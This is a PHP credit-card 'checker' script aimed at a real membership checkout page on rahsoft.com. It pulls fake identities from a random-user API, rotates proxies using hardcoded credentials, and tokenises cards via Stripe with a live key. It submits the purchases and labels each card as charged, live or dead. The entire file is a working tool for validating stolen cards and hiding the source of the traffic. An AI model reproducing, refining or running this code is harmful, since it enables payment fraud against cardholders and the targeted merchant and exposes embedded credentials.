
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://rahsoft.com/membership-account/membership-checkout/" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$username = strtolower($name) . '.' . strtolower($last) . rand(0000, 9999);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'g17acjzuxdo4wcp-country-us-session-8whnowhfrx-lifetime-120:sdyqdt8oyehnjf5', //=my id//
  2 => 'g17acjzuxdo4wcp-country-us-session-8whnowhfrx-lifetime-120:sdyqdt8oyehnjf5',
  3 => 'g17acjzuxdo4wcp-country-us-session-8whnowhfrx-lifetime-120:sdyqdt8oyehnjf5',
  4 => 'g17acjzuxdo4wcp-country-us-session-8whnowhfrx-lifetime-120:sdyqdt8oyehnjf5',
  5 => 'g17acjzuxdo4wcp-country-us-session-8whnowhfrx-lifetime-120:sdyqdt8oyehnjf5',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://rp.proxyscrape.com:6060',
  2 => 'http://rp.proxyscrape.com:6060',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "🟢";
}
if (empty($ip1)){
$ip = "🔴";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://rp.proxyscrape.com:6060"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 AlohaBrowser/0.7.2.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=41780554-c38c-4e60-8dbe-d7488df0ad4cbd35ac&muid=79dd8f37-7f8c-4496-82fa-5db6dd5e75ade50147&sid=d490a339-aab6-4089-980b-9d1689f2b6650dc3a7&pasted_fields=number&payment_user_agent=stripe.js%2F7f87617255%3B+stripe-js-v3%2F7f87617255%3B+split-card-element&referrer=https%3A%2F%2Frahsoft.com&time_on_page=72859&key=pk_live_NOJeyUlp4H50It5860TqjXsh');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
$br = trim(strip_tags(getStr($result1,'"brand": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://rp.proxyscrape.com:6060"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://rahsoft.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: rahsoft.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.6',
'content-type: application/x-www-form-urlencoded',
'cookie: lp_session_guest=g-660ffd7d6cd0f; PHPSESSID=460unjh9sant21ljbkuhb1radd; pmpro_visit=1; __stripe_mid=79dd8f37-7f8c-4496-82fa-5db6dd5e75ade50147; __stripe_sid=d490a339-aab6-4089-980b-9d1689f2b6650dc3a7',
'origin: https://rahsoft.com',
'referer: https://rahsoft.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 AlohaBrowser/0.7.2.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&other_discount_code=&username='.$username.'&password='.$name.'%4012345&password2='.$name.'%4012345&bemail='.$name.''.$last.'343%40gmail.com&bconfirmemail='.$name.''.$last.'343%40gmail.com&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$l4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');



$result2 = curl_exec($ch);
# ---------------------------------------#
$Respo = trim(strip_tags(getStr($result2,'"pmpro_message pmpro_error">','</div>')));

# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE  ✅@AntifiedNull'.$ip.'  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
    exit;
    }
    elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅@AntifiedNull'.$ip.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ☯_'.$ip.'  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ☯_'.$ip.' </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ☯_'.$ip.' </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ☯_'.$ip.' </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ☯_'.$ip.' </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.'  ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅@AntifiedNull'.$ip.'   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅@AntifiedNull'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '𝙇𝙄𝙑𝙀</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅@AntifiedNull'.$ip.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ☯_'.$ip.' </span><br>';

}



curl_close($ch);
ob_flush();
echo "</i><font size=2 color='grey'>$ip: $ip1</i></font><br>";
//echo $result1;
//echo $result2; 
echo "<br><b>RESPONSE:</b> $Respo<br><br>";
?>